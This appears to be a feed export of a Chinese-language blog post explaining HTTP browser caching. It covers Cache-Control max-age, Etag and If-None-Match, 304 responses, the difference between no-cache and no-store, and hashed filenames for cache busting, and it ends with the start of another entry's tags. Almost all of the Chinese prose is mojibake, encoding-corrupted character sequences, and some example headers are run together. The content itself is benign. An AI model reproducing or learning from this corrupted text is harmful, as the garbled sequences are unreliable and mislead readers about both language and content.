å¦‚æœåœ¨åŠå¹´å¾Œæˆ‘é‡æ–°è«‹æ±‚é€™å¼µåœ–ç‰‡ï¼Œç€è¦½å™¨å°±æœƒè·Ÿæˆ‘èªªï¼šã€Œä½ ä¸ç”¨é‡æ–°è«‹æ±‚å–”ï¼Œé€™ä¸€ä»½æª”æ¡ˆçš„éæœŸæ™‚é–“æ˜¯ä¸€å¹´ï¼Œç¾åœ¨æ‰éäº†åŠå¹´ã€‚ä½ è¦è³‡æ–™æ˜¯å§ï¼Ÿæˆ‘é€™é‚Šå°±æœ‰å›‰ï¼ã€ï¼Œæ–¼æ˜¯å°±ä¸æœƒç™¼é€ä»»ä½• Requestï¼Œè€Œæ˜¯ç›´æ¥å¾ç€è¦½å™¨é‚£é‚Šç²å¾—è³‡æ–™ã€‚
æ¥è‘—æˆ‘åœ¨éäº†ä¸€å¹´ä¹‹å¾Œå†è«‹æ±‚ä¸€æ¬¡é€™å¼µåœ–ç‰‡ï¼Œç€è¦½å™¨å°±æœƒèªªï¼šã€Œå—¯å—¯ï¼Œæˆ‘é€™é‚Šçš„å¿«å–çš„ç¢ºéæœŸäº†ï¼Œæˆ‘å¹«ä½ å» Server å•ä¸€ä¸‹æª”æ¡ˆå¾2017-01-01 13:00:00ä»¥å¾Œæœ‰æ²’æœ‰æ›´æ–°ã€ï¼Œæœƒç™¼é€å‡ºä¸‹é¢é€™æ¨£çš„ Requestï¼š
GET /logo.pngIf-Modified-Since: 2017-01-01 13:00:00

å‡è¨­æª”æ¡ˆç¢ºå¯¦æ›´æ–°äº†ï¼Œé‚£ç€è¦½å™¨å°±æœƒæ”¶åˆ°ä¸€ä»½æ–°çš„æª”æ¡ˆã€‚å¦‚æœæ–°çš„æª”æ¡ˆä¸€æ¨£æœ‰é‚£äº› Cache çš„ Headerï¼Œå°±ä¸€æ¨£æœƒå¿«å–èµ·ä¾†ï¼Œè·Ÿä¸Šé¢çš„æµç¨‹éƒ½ä¸€æ¨£ã€‚é‚£å‡è¨­æª”æ¡ˆæ²’æœ‰æ›´æ–°å‘¢ï¼Ÿ
å‡è¨­æ²’æœ‰æ›´æ–°çš„è©±ï¼ŒServer å°±æœƒå›ä¸€å€‹Status code: 304 (Not Modified)ï¼Œä»£è¡¨ä½ å¯ä»¥ç¹¼çºŒæ²¿ç”¨å¿«å–çš„é€™ä»½æª”æ¡ˆã€‚

Etag èˆ‡ If-None-Matché›–ç„¶ä¸Šé¢çš„é€™å€‹æ–¹æ³•çœ‹èµ·ä¾†å·²ç¶“å¾ˆå¥½äº†ï¼Œä½†é‚„æ˜¯æœ‰ä¸€å€‹å°å•é¡Œã€‚
ä¸Šé¢è¬›çš„æ˜¯æª”æ¡ˆæœ‰æ²’æœ‰è¢«ã€Œç·¨è¼¯ã€éï¼Œä½†å…¶å¯¦é€™å€‹ç·¨è¼¯æ™‚é–“å°±æ˜¯ä½ é›»è…¦ä¸Šæª”æ¡ˆçš„ç·¨è¼¯æ™‚é–“ã€‚è‹¥æ˜¯ä½ æ‰“é–‹æª”æ¡ˆä»€éº¼éƒ½ä¸åšï¼Œç„¶å¾Œå­˜æª”ï¼Œé€™å€‹ç·¨è¼¯æ™‚é–“ä¹Ÿæœƒè¢«æ›´æ–°ã€‚å¯æ˜¯å„˜ç®¡ç·¨è¼¯æ™‚é–“ä¸ä¸€æ¨£ï¼Œæª”æ¡ˆçš„å…§å®¹é‚„æ˜¯ä¸€æ¨¡ä¸€æ¨£çš„ã€‚
æ¯”èµ·ç·¨è¼¯æ™‚é–“ï¼Œè‹¥æ˜¯èƒ½ç”¨ã€Œæª”æ¡ˆå…§å®¹æ›´å‹•èˆ‡å¦ã€ä¾†ç•¶ä½œæ˜¯å¦è¦æ›´æ–°å¿«å–çš„æ¢ä»¶ï¼Œé‚£æ˜¯å†å¥½ä¸éäº†ã€‚
è€ŒEtagé€™å€‹ Header å°±æ˜¯é€™æ¨£çš„ä¸€å€‹æ±è¥¿ã€‚ä½ å¯ä»¥æŠŠ Etag æƒ³æˆæ˜¯é€™ä»½æª”æ¡ˆå…§å®¹çš„ hash å€¼ï¼ˆä½†å…¶å¯¦ä¸æ˜¯ï¼Œä½†åŸç†é¡ä¼¼å°±æ˜¯äº†ï¼Œç¸½ä¹‹å°±æ˜¯ä¸€æ¨£çš„å…§å®¹æœƒç”¢ç”Ÿä¸€æ¨£çš„ hashï¼Œä¸ä¸€æ¨£çš„æœƒç”¢ç”Ÿä¸ä¸€æ¨£çš„ hashï¼‰ã€‚
åœ¨ Response è£¡é¢ Server æœƒå¸¶ä¸Šé€™å€‹æª”æ¡ˆçš„ Etagï¼Œç­‰å¿«å–éæœŸä¹‹å¾Œï¼Œç€è¦½å™¨å°±å¯ä»¥æ‹¿é€™å€‹ Etag å»å•èªªæª”æ¡ˆæ˜¯ä¸æ˜¯æœ‰è¢«æ›´å‹•éã€‚
Etagè·ŸIf-None-Matchä¹Ÿæ˜¯æ­é…ä½¿ç”¨çš„ä¸€å°ï¼Œå°±åƒLast-Modifiedè·ŸIf-Modified-Sinceä¸€æ¨£ã€‚
Server åœ¨å›å‚³ Response çš„æ™‚å€™å¸¶ä¸ŠEtagè¡¨ç¤ºé€™å€‹æª”æ¡ˆç¨æœ‰çš„ hashï¼Œå¿«å–éæœŸå¾Œç€è¦½å™¨ç™¼é€If-None-Matchè©¢å• Server æ˜¯å¦æœ‰æ–°çš„è³‡æ–™ï¼ˆä¸ç¬¦åˆé€™å€‹Etagçš„è³‡æ–™ï¼‰ï¼Œæœ‰çš„è©±å°±å›å‚³æ–°çš„ï¼Œæ²’æœ‰çš„è©±å°±åªè¦å›å‚³ 304 å°±å¥½äº†ã€‚
æµç¨‹å¯ä»¥åƒè€ƒ Google ç¶²ç«™ä¸Šçš„ä¸‹åœ–ï¼š
ï¼ˆåœ–ç‰‡ä¾†æºï¼šhttps://developers.google.com/web/fundamentals/performance/optimizing-content-efficiency/images/http-cache-control.png?hl=zh-twï¼‰
ä¸­å ´ä¼‘æ¯è®“æˆ‘å€‘ä¾†ç¸½çµä¸€ä¸‹åˆ°ç›®å‰ç‚ºæ­¢å­¸åˆ°çš„æ±è¥¿ï¼š

Expiresè·ŸCache-Control: max-ageæ±ºå®šé€™ä»½å¿«å–çš„ã€Œæ–°é®®åº¦ã€ï¼Œä¹Ÿå°±æ˜¯ä»€éº¼æ™‚å€™ã€ŒéæœŸã€ã€‚åœ¨éæœŸä¹‹å‰ï¼Œç€è¦½å™¨ã€Œä¸æœƒã€ç™¼é€å‡ºä»»ä½• Request
ç•¶å¿«å–éæœŸä¹‹å¾Œï¼Œå¯ä»¥ç”¨If-Modified-Sinceæˆ–æ˜¯If-None-Matchè©¢å• Server æœ‰æ²’æœ‰æ–°çš„è³‡æºï¼Œå¦‚æœæœ‰çš„è©±å°±å›å‚³æ–°çš„ï¼Œæ²’æœ‰çš„è©±å°±å›å‚³ Status code 304ï¼Œä»£è¡¨å¿«å–è£¡é¢çš„è³‡æºé‚„èƒ½ç¹¼çºŒæ²¿ç”¨ã€‚

æœ‰äº†é€™å¹¾å€‹ Header ä¹‹å¾Œï¼Œä¸–ç•Œçœ‹ä¼¼ç¾å¥½ï¼Œå¥½åƒæ‰€æœ‰çš„å•é¡Œéƒ½è§£æ±ºäº†ä¸€æ¨£ã€‚
æ˜¯çš„ï¼Œæˆ‘èªªã€Œå¥½åƒã€ï¼Œä»£è¡¨å…¶å¯¦é‚„æœ‰ä¸€äº›å•é¡Œå­˜åœ¨ã€‚
ä¸è¦å¿«å–æ€éº¼è¾¦ï¼Ÿæœ‰ä¸€äº›é é¢å¯èƒ½æœƒä¸æƒ³è¦ä»»ä½•çš„å¿«å–ï¼Œä¾‹å¦‚èªªå«æœ‰ä¸€äº›æ©Ÿå¯†è³‡æ–™çš„é é¢ï¼Œå°±ä¸å¸Œæœ›ä»»ä½•çš„æ±è¥¿è¢«ä¿ç•™åœ¨ Client ç«¯ã€‚
é‚„è¨˜å¾—æˆ‘å€‘ä¸€é–‹å§‹æœ‰æéCache-Controlé€™å€‹ Header å…¶å¯¦è§£æ±ºäº†æ›´å¤šå•é¡Œå—ï¼Ÿé™¤äº†å¯ä»¥æŒ‡å®šmax-ageä»¥å¤–ï¼Œå¯ä»¥ç›´æ¥ä½¿ç”¨ï¼šCache-Control: no-storeï¼Œä»£è¡¨èªªï¼šã€Œæˆ‘å°±æ˜¯ä¸è¦ä»»ä½•å¿«å–ã€ã€‚
å› æ­¤æ¯ä¸€æ¬¡è«‹æ±‚éƒ½å¿…å®šæœƒåˆ°é” Server å»è¦æ±‚æ–°çš„è³‡æ–™ï¼Œä¸æœƒæœ‰ä»»ä½•è³‡è¨Šè¢«å¿«å–ä½ã€‚
ï¼ˆè¨»ï¼šHTTP 1.0 è£¡é¢æœ‰ä¸€å€‹Pragmaçš„ Headerï¼Œä½¿ç”¨æ–¹æ³•åªæœ‰ä¸€ç¨®ï¼Œå°±æ˜¯ï¼šPragma: no-cacheï¼Œæœ‰ç¶²è·¯ä¸Šçš„è³‡æ–™èªªå®ƒå°±æ˜¯ä¸è¦ä»»ä½•å¿«å–çš„æ„æ€ï¼Œä½†æ ¹æ“šRFC7232çš„èªªæ³•ï¼Œé€™å€‹ç”¨æ³•æ‡‰è©²è·ŸCache-Control: no-cacheä¸€æ¨£ï¼Œè€Œä¸æ˜¯Cache-Control: no-storeï¼Œé€™å…©å€‹çš„å·®ç•°ç­‰ç­‰æœƒæåˆ°ï¼‰
é¦–é çš„å¿«å–ç­–ç•¥å‰›å‰›ä¸Šé¢æåˆ°çš„éƒ½æ˜¯ä¸€äº›éœæ…‹è³‡æºä¾‹å¦‚èªªåœ–ç‰‡ï¼Œç‰¹æ€§å°±æ˜¯æœƒæœ‰å¥½ä¸€é™£å­ä¸æœƒè®Šå‹•ï¼Œå› æ­¤å¯ä»¥æ”¾å¿ƒåœ°ä½¿ç”¨max-ageã€‚
ä½†ç¾åœ¨æˆ‘å€‘è€ƒæ…®åˆ°å¦å¤–ä¸€ç¨®ç‹€æ³ï¼Œé‚£å°±æ˜¯ç¶²ç«™é¦–é ã€‚
ç¶²ç«™é¦–é é›–ç„¶ä¹Ÿä¸å¸¸æœƒè®Šå‹•ï¼Œä½†æˆ‘å€‘å¸Œæœ›åªè¦ä¸€è®Šå‹•ï¼Œä½¿ç”¨è€…å°±èƒ½å¤ é¦¬ä¸Šçœ‹åˆ°è®ŠåŒ–ã€‚é‚£è¦æ€éº¼è¾¦å‘¢ï¼Ÿè¨­max-ageå—ï¼Ÿä¹Ÿæ˜¯å¯ä»¥ï¼Œä¾‹å¦‚èªªCache-Control: max-age=30ï¼Œåªè¦é 30 ç§’å°±èƒ½è®“å¿«å–éæœŸï¼Œå»è·Ÿ Server æ‹¿æ–°çš„è³‡æ–™ã€‚
ä½†å¦‚æœæˆ‘å€‘æƒ³è¦æ›´å³æ™‚å‘¢ï¼Ÿåªè¦ä¸€è®Šå‹•ï¼Œä½¿ç”¨è€…å°±èƒ½å¤ é¦¬ä¸Šçœ‹åˆ°è®ŠåŒ–ã€‚ä½ å¯èƒ½æœƒèªªï¼šã€Œé‚£æˆ‘å€‘å¯ä»¥ä¸è¦å¿«å–å°±å¥½å•¦ï¼Œæ¯æ¬¡éƒ½æŠ“å–æ–°çš„é é¢ã€ã€‚å¯æ˜¯å¦‚æœé€™å€‹é¦–é æœ‰ä¸€å€‹ç¦®æ‹œéƒ½æ²’æœ‰è®Šï¼Œå…¶å¯¦ä½¿ç”¨å¿«å–æœƒæ˜¯æ¯”è¼ƒå¥½çš„è¾¦æ³•ï¼Œç¯€çœå¾ˆå¤šæµé‡ã€‚
å› æ­¤æˆ‘å€‘çš„ç›®çš„æ˜¯ï¼šã€ŒæŠŠé é¢å¿«å–èµ·ä¾†ï¼Œä½†åªè¦é¦–é ä¸€è®Šå‹•ï¼Œå°±èƒ½å¤ ç«‹åˆ»çœ‹åˆ°æ–°çš„é é¢ã€
é€™å€‹æ€éº¼åšåˆ°å‘¢ï¼Ÿç¬¬ä¸€æ‹›ï¼Œä½ å¯ä»¥ç”¨Cache-Control: max-age=0ï¼Œé€™å°±ä»£è¡¨èªªé€™å€‹ Response 0 ç§’ä¹‹å¾Œå°±æœƒéæœŸï¼Œæ„æ€æ˜¯ç€è¦½å™¨ä¸€æ¥æ”¶åˆ°ï¼Œå°±æœƒæ¨™ç¤ºç‚ºéæœŸã€‚é€™æ¨£ç•¶ä½¿ç”¨è€…å†æ¬¡é€ è¨ªé é¢ï¼Œå°±æœƒå» Server è©¢å•æœ‰æ²’æœ‰æ–°çš„è³‡æ–™ï¼Œå†æ­é…ä¸ŠEtagä¾†ä½¿ç”¨ï¼Œå°±å¯ä»¥ä¿è­‰åªæœƒä¸‹è¼‰åˆ°æœ€æ–°çš„ Responseã€‚
ä¾‹å¦‚èªªç¬¬ä¸€å€‹ Response å¯èƒ½æ˜¯é€™æ¨£ï¼š
Cache-Control: max-age=0Etag: 1234

æˆ‘é‡æ–°æ•´ç†ä¸€æ¬¡ï¼Œç€è¦½å™¨ç™¼å‡ºé€™æ¨£çš„ Requestï¼š
If-None-Match: 1234

å¦‚æœæª”æ¡ˆæ²’æœ‰è®Šå‹•ï¼ŒServer å°±æœƒå›å‚³ï¼š304 Modifiedï¼Œæœ‰è®Šå‹•çš„è©±å°±æœƒå›å‚³æ–°çš„æª”æ¡ˆä¸¦ä¸”æ›´æ–°Etagã€‚å¦‚æœæ˜¯ä½¿ç”¨é€™ç¨®æ–¹å¼ï¼Œå…¶å¯¦å°±æ˜¯ã€Œæ¯ä¸€æ¬¡é€ è¨ªé é¢éƒ½æœƒç™¼é€ä¸€å€‹ Request å»ç¢ºèªæœ‰æ²’æœ‰æ–°çš„æª”æ¡ˆï¼Œæœ‰çš„è©±å°±ä¸‹è¼‰æ›´æ–°ï¼Œæ²’æœ‰çš„è©±æ²¿ç”¨å¿«å–è£¡çš„ã€ã€‚
é™¤äº†ä¸Šé¢é€™æ‹›max-age=0ï¼Œå…¶å¯¦æœ‰ä¸€å€‹å·²ç¶“è¦ç¯„å¥½çš„ç­–ç•¥å«åšï¼šCache-Control: no-cacheã€‚no-cacheä¸¦ä¸æ˜¯ã€Œå®Œå…¨ä¸ä½¿ç”¨å¿«å–çš„æ„æ€ã€ï¼Œè€Œæ˜¯è·Ÿæˆ‘å€‘ä¸Šé¢çš„è¡Œç‚ºä¸€æ¨£ã€‚æ¯æ¬¡éƒ½æœƒç™¼é€ Request å»ç¢ºèªæ˜¯å¦æœ‰æ–°çš„æª”æ¡ˆã€‚
ï¼ˆè¨»ï¼šå…¶å¯¦é€™å…©ç¨®é‚„æ˜¯æœ‰å¾ˆç´°å¾®çš„å·®åˆ¥ï¼Œå¯åƒè€ƒWhatâ€™s the difference between Cache-Control: max-age&#x3D;0 and no-cache?ï¼‰
å¦‚æœè¦ã€Œå®Œå…¨ä¸ä½¿ç”¨å¿«å–ã€ï¼Œæ˜¯Cache-Control: no-storeã€‚é€™é‚Šä¸è¦ææ··äº†ã€‚
ç‚ºäº†æ€•å¤§å®¶ææ··ï¼Œæˆ‘å†è¬›ä¸€æ¬¡é€™å…©å€‹çš„å·®ç•°ï¼š
å‡è¨­ A ç¶²ç«™æ˜¯ä½¿ç”¨Cache-Control: no-storeï¼ŒB ç¶²ç«™æ˜¯ä½¿ç”¨Cache-Control: no-cacheã€‚
ç•¶æ¯ä¸€æ¬¡é‡æ–°é€ è¨ªåŒæ¨£ä¸€å€‹é é¢çš„æ™‚å€™ï¼Œç„¡è«– A ç¶²ç«™æœ‰æ²’æœ‰æ›´æ–°ï¼ŒA ç¶²ç«™éƒ½æœƒå‚³ä¾†ã€Œæ•´ä»½æ–°çš„æª”æ¡ˆã€ï¼Œå‡è¨­index.htmlæœ‰ 100 kb å¥½äº†ï¼Œé€ è¨ªäº†åæ¬¡ï¼Œç´¯ç©çš„æµé‡å°±æ˜¯ 1000kbã€‚
B ç¶²ç«™çš„è©±ï¼Œæˆ‘å€‘å‡è¨­å‰ä¹æ¬¡ç¶²ç«™éƒ½æ²’æœ‰æ›´æ–°ï¼Œä¸€ç›´åˆ°ç¬¬åæ¬¡æ‰æ›´æ–°ã€‚æ‰€ä»¥å‰ä¹æ¬¡ Server åªæœƒå›å‚³ Status code 304ï¼Œé€™å€‹å°åŒ…å¤§å°æˆ‘å€‘å§‘ä¸”ç®—ä½œ 1kb å¥½äº†ã€‚ç¬¬åæ¬¡å› ç‚ºæœ‰æ–°çš„æª”æ¡ˆï¼Œæœƒæ˜¯ 100kbã€‚é‚£åæ¬¡åŠ èµ·ä¾†çš„æµé‡å°±æ˜¯ 9 + 100 &#x3D; 109 kb
å¯ä»¥ç™¼ç¾ A è·Ÿ B é”æˆçš„æ•ˆæœä¸€æ¨£ï¼Œé‚£å°±æ˜¯ã€Œåªè¦ç¶²ç«™æ›´æ–°ï¼Œä½¿ç”¨è€…å°±èƒ½ç«‹å³çœ‹åˆ°çµæœã€ï¼Œä½†æ˜¯ B çš„æµé‡é ä½æ–¼ Aï¼Œå› ç‚ºæœ‰å–„ç”¨å¿«å–ç­–ç•¥ã€‚åªè¦æ¯ä¸€æ¬¡ Request éƒ½å…ˆç¢ºèªç¶²ç«™æœ‰æ²’æœ‰æ›´æ–°å³å¯ï¼Œä¸ç”¨æ¯ä¸€æ¬¡éƒ½æŠ“å®Œæ•´çš„æª”æ¡ˆä¸‹ä¾†ã€‚
é€™å°±æ˜¯no-storeè·Ÿno-cacheçš„å·®ç•°ï¼Œæ°¸é ä¸ç”¨å¿«å–è·Ÿæ°¸é æª¢æŸ¥å¿«å–ã€‚
æœ€å¾Œä¸€å€‹å•é¡Œç¾åœ¨ Web App ç•¶é“ï¼Œè¨±å¤šç¶²ç«™éƒ½æ˜¯æ¡ç”¨ SPA çš„æ¶æ§‹æ­é… Webpack æ‰“åŒ…ã€‚å‰ç«¯åªéœ€è¦å¼•å…¥ä¸€å€‹ JavaScript çš„æª”æ¡ˆï¼ŒRender å°±äº¤çµ¦ JavaScript ä¾†åšå°±å¥½ã€‚
é€™é¡å‹çš„ç¶²ç«™ï¼ŒHTML å¯èƒ½é•·å¾—åƒé€™æ¨£ï¼š
&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;  &lt;link rel=&#x27;stylesheet&#x27; href=&#x27;style.css&#x27;&gt;&lt;/link&gt;  &lt;script src=&#x27;script.js&#x27;&gt;&lt;/script&gt;&lt;/head&gt;&lt;body&gt; &lt;!-- body ç‚ºç©ºï¼Œæ‰€æœ‰å…§å®¹éƒ½äº¤çµ¦ js å» render --&gt;&lt;/body&gt;&lt;/html&gt;

ç•¶ JavaScript è¼‰å…¥ä¹‹å¾Œï¼Œåˆ©ç”¨ JavaScript æŠŠé é¢æ¸²æŸ“å‡ºä¾†ã€‚
é¢å°é€™ç¨®æƒ…å¢ƒï¼Œæˆ‘å€‘å°±æœƒå¸Œæœ›é€™å€‹æª”æ¡ˆèƒ½å¤ è·Ÿä¸Šé¢çš„é¦–é æª”æ¡ˆä¸€æ¨£ï¼Œã€Œåªè¦æª”æ¡ˆæ›´æ–°ï¼Œä½¿ç”¨è€…èƒ½å¤ ç«‹å³çœ‹åˆ°æ–°çš„çµæœã€ï¼Œå› æ­¤æˆ‘å€‘å¯ä»¥ç”¨Cache-Control: no-cacheä¾†é”æˆé€™å€‹ç›®æ¨™ã€‚
å¯æ˜¯å‘¢ï¼Œé‚„è¨˜å¾—å‰›èªªéno-cacheå…¶å¯¦å°±æ˜¯æ¯ä¸€æ¬¡è¨ªå•é é¢ï¼Œéƒ½å» Server å•èªªæœ‰æ²’æœ‰æ–°çš„çµæœã€‚æ„æ€å°±æ˜¯ç„¡è«–å¦‚ä½•ï¼Œéƒ½æœƒç™¼å‡º Requestã€‚
æœ‰æ²’æœ‰å¯èƒ½ï¼Œé€£ Request éƒ½ä¸ç™¼å‘¢ï¼Ÿ
æ„æ€å°±æ˜¯ï¼šã€Œåªè¦æª”æ¡ˆä¸æ›´æ–°ï¼Œç€è¦½å™¨å°±ä¸æœƒç™¼ Requestï¼Œç›´æ¥æ²¿ç”¨å¿«å–è£¡çš„å³å¯ã€‚åªè¦æª”æ¡ˆä¸€æ›´æ–°ï¼Œç€è¦½å™¨å°±è¦ç«‹å³æŠ“å–æ–°çš„æª”æ¡ˆã€
å‰è€…å…¶å¯¦å°±æ˜¯æˆ‘å€‘ä¸€é–‹å§‹è¬›çš„max-ageåœ¨åšçš„äº‹ï¼Œä½†max-ageæ²’è¾¦æ³•åšåˆ°åˆ¤æ–·ã€Œæª”æ¡ˆä¸æ›´æ–°ã€é€™ä»¶äº‹æƒ…ã€‚
æ‰€ä»¥å…¶å¯¦é€™å€‹ç›®æ¨™ï¼Œæ²’è¾¦æ³•å–®é ä¸Šé¢æˆ‘å€‘ä»‹ç´¹çš„é€™äº›ç€è¦½å™¨çš„å¿«å–æ©Ÿåˆ¶ä¾†é”æˆï¼Œéœ€è¦ Server é‚£é‚Šä¸€èµ·é…åˆæ‰è¡Œã€‚å…¶å¯¦èªªç©¿äº†ï¼Œå°±æ˜¯æŠŠ Etag çš„æ©Ÿåˆ¶è‡ªå·±å¯¦ä½œåœ¨æª”æ¡ˆè£¡é¢ã€‚
ä»€éº¼æ„æ€å‘¢ï¼Ÿæˆ‘å€‘ç›´æ¥ä¾†çœ‹ä¸€å€‹ç¯„ä¾‹ï¼Œæˆ‘å€‘æŠŠindex.htmlæ”¹æˆé€™æ¨£ï¼š
&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;  &lt;link rel=&#x27;stylesheet&#x27; href=&#x27;style.css&#x27;&gt;&lt;/link&gt;  &lt;script src=&#x27;script-qd3j2orjoa.js&#x27;&gt;&lt;/script&gt;&lt;/head&gt;&lt;body&gt; &lt;!-- body ç‚ºç©ºï¼Œæ‰€æœ‰å…§å®¹éƒ½äº¤çµ¦ js å» render --&gt;&lt;/body&gt;&lt;/html&gt;

æ³¨æ„åˆ° JavaScript çš„æª”åè®Šæˆï¼šscript-qd3j2orjoa.jsï¼Œå¾Œé¢å…¶å¯¦å°±è·Ÿ Etag ä¸€æ¨£ï¼Œéƒ½æ˜¯ä»£è¡¨é€™å€‹æª”æ¡ˆçš„ hash å€¼ã€‚ç„¶å¾Œæˆ‘å€‘æŠŠé€™å€‹æª”æ¡ˆçš„å¿«å–ç­–ç•¥è¨­æˆï¼šCache-Control: max-age=31536000ã€‚
é€™æ¨£å­é€™å€‹æª”æ¡ˆå°±æœƒè¢«å¿«å–ä½ä¸€å¹´ã€‚ä¸€å¹´ä¹‹å…§éƒ½ä¸æœƒå°é€™å€‹ URL ç™¼é€æ–°çš„ Requestã€‚
é‚£å¦‚æœæˆ‘å€‘è¦æ›´æ–°çš„è©±æ€éº¼è¾¦å‘¢ï¼Ÿæˆ‘å€‘ä¸è¦æ›´æ–°é€™å€‹æª”æ¡ˆï¼Œç›´æ¥æ›´æ–°index.htmlï¼Œæ›ä¸€å€‹ JavaScript æª”æ¡ˆï¼š
&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;  &lt;link rel=&#x27;stylesheet&#x27; href=&#x27;style.css&#x27;&gt;&lt;/link&gt;  &lt;script src=&#x27;script-8953jief32.js&#x27;&gt;&lt;/script&gt;&lt;/head&gt;&lt;body&gt; &lt;!-- body ç‚ºç©ºï¼Œæ‰€æœ‰å…§å®¹éƒ½äº¤çµ¦ js å» render --&gt;&lt;/body&gt;&lt;/html&gt;

å› ç‚ºindex.htmlçš„å¿«å–ç­–ç•¥æ˜¯no-cacheï¼Œæ‰€ä»¥æ¯ä¸€æ¬¡è¨ªå•é€™å€‹é é¢ï¼Œéƒ½æœƒå»çœ‹index.htmlæ˜¯å¦æ›´æ–°ã€‚
ä»¥ç¾åœ¨é€™å€‹ä¾‹å­ä¾†èªªï¼Œå®ƒçš„ç¢ºæ›´æ–°äº†ï¼Œå› æ­¤æ–°çš„é€™ä»½å°±æœƒå‚³å›çµ¦ç€è¦½å™¨ã€‚è€Œç€è¦½å™¨ç™¼ç¾æœ‰æ–°çš„ JavaScript æª”æ¡ˆå°±æœƒå»ä¸‹è¼‰ä¸¦ä¸”å¿«å–èµ·ä¾†ã€‚
è—‰ç”±æŠŠ Etag çš„æ©Ÿåˆ¶å¯¦ä½œåœ¨index.htmlè£¡é¢ï¼Œæˆ‘å€‘å°±é”æˆäº†æˆ‘å€‘çš„ç›®æ¨™ï¼šã€Œåªè¦æª”æ¡ˆä¸æ›´æ–°ï¼Œç€è¦½å™¨å°±ä¸æœƒç™¼ Requestï¼Œç›´æ¥æ²¿ç”¨å¿«å–è£¡çš„å³å¯ã€‚åªè¦æª”æ¡ˆä¸€æ›´æ–°ï¼Œç€è¦½å™¨å°±è¦ç«‹å³æŠ“å–æ–°çš„æª”æ¡ˆã€
åŸç†å°±æ˜¯é‡å°ä¸åŒçš„æª”æ¡ˆæ¡ç”¨ä¸åŒçš„å¿«å–ç­–ç•¥ï¼Œä¸¦ä¸”ç›´æ¥ç”¨ã€Œæ›´æ› JavaScript æª”æ¡ˆã€çš„æ–¹å¼å¼·åˆ¶ç€è¦½å™¨é‡æ–°ä¸‹è¼‰ã€‚
é€™é‚Šä¹Ÿå¯ä»¥åƒè€ƒ Google æä¾›çš„åœ–ç‰‡ï¼š

ï¼ˆä¾†æºï¼šhttps://developers.google.com/web/fundamentals/performance/optimizing-content-efficiency/http-caching?hl=zh-twï¼‰
ç¸½çµä¹‹æ‰€ä»¥å¿«å–çš„æ©Ÿåˆ¶æœƒæœ‰é»å°è¤‡é›œï¼Œæ˜¯å› ç‚ºåˆ†æˆä¸åŒçš„éƒ¨åˆ†ï¼Œæ¯ä¸€å€‹ç›¸é—œçš„ Header å…¶å¯¦éƒ½æ˜¯åœ¨è² è²¬ä¸åŒçš„éƒ¨åˆ†ã€‚ä¾‹å¦‚èªªExpiresè·Ÿmax-ageæ˜¯åœ¨è² è²¬çœ‹é€™å€‹å¿«å–æ˜¯ä¸æ˜¯ã€Œæ–°é®®ã€ï¼ŒLast-Modified, If-Modified-Since, Etag, If-None-Matchæ˜¯è² è²¬è©¢å•é€™å€‹å¿«å–èƒ½ä¸èƒ½ã€Œç¹¼çºŒä½¿ç”¨ã€ï¼Œè€Œno-cacheèˆ‡no-storeå‰‡æ˜¯ä»£è¡¨åˆ°åº•è¦ä¸è¦ä½¿ç”¨å¿«å–ï¼Œä»¥åŠæ‡‰è©²å¦‚ä½•ä½¿ç”¨ã€‚
é€™ç¯‡æ–‡ç« å…¶å¯¦åªè¬›åˆ°å¿«å–æ©Ÿåˆ¶çš„ä¸€åŠï¼Œæ²’æœ‰æåˆ°çš„éƒ¨åˆ†å¤§è‡´ä¸Šéƒ½è·Ÿ shared cache ä»¥åŠ proxy server æœ‰é—œï¼Œæœ‰å…¶ä»–çš„å€¼æ˜¯åœ¨æ±ºå®šå¿«å–èƒ½ä¸èƒ½è¢«å­˜åœ¨ proxy server ä¸Šï¼Ÿæˆ–è€…æ˜¯é©—è­‰èƒ½å¦ç¹¼çºŒä½¿ç”¨çš„æ™‚å€™æ‡‰è©²è¦è·ŸåŸ server é©—è­‰ï¼Œé‚„æ˜¯è·Ÿ proxy server é©—è­‰ä¹Ÿå¯ä»¥ã€‚æœ‰èˆˆè¶£æƒ³è¦çŸ¥é“æ›´å¤šçš„è®€è€…å€‘å¯ä»¥åƒè€ƒåº•ä¸‹çš„åƒè€ƒè³‡æ–™ã€‚
æœ€å¾Œï¼Œå¸Œæœ›é€™ç¯‡æ–‡ç« èƒ½è®“åˆå­¸è€…æ›´ç†è§£ HTTP çš„å¿«å–æ©Ÿåˆ¶ã€‚
åƒè€ƒè³‡æ–™
å½»åº•å¼„æ‡‚ Http ç¼“å­˜æœºåˆ¶ - åŸºäºç¼“å­˜ç­–ç•¥ä¸‰è¦ç´ åˆ†è§£æ³•
æµ…è°ˆæµè§ˆå™¨httpçš„ç¼“å­˜æœºåˆ¶
ä½¿ç”¨ HTTP ç¼“å­˜ï¼šEtag, Last-Modified ä¸ Cache-Control
ã€Webç¼“å­˜æœºåˆ¶ç³»åˆ—ã€‘1 â€“ Webç¼“å­˜çš„ä½œç”¨ä¸ç±»å‹
HTTPç¼“å­˜æ§åˆ¶å°ç»“
MDN - Cache-Control
rfc2616
Google Web Fundamentals
HTTP 1.0 spec

é—œæ–¼ä½œè€…ï¼š@huli é‡ç”Ÿå·¥ç¨‹å¸«ï¼Œç›¸ä¿¡åˆ†äº«èˆ‡äº¤æµèƒ½è®“ä¸–ç•Œè®Šå¾—æ›´ç¾å¥½
]]></content>
      <tags>
        <tag>cache</tag>
        <tag>http header</tag>
      </tags>
  </entry>
  <entry>
    <title>D3v4 &amp; Canvas å·¥ä½œåŠ - D3 + Canvas ç¹ªè£½å‹•æ…‹è·¯ç·šåœ–</title>
    <url>/2017/08/26/canvas-path-map/</url>
